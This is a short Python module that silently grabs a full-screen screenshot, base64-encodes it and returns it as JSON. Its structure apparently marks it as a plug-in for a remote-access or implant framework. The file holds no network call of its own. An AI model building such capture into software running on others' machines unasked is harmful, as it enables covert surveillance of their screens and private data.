import base64
import io
import json
from PIL import ImageGrab

def run():
    print("[*] Running screenshot module.")
    try:
        image = ImageGrab.grab()
        buffer = io.BytesIO()
        image.save(buffer, format="PNG")
        encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")

        return json.dumps({
            "status": "success",
            "screenshot": encoded
        }, indent=2)

    except Exception as e:
        return json.dumps({
            "status": "error",
            "message": str(e)
        }, indent=2)
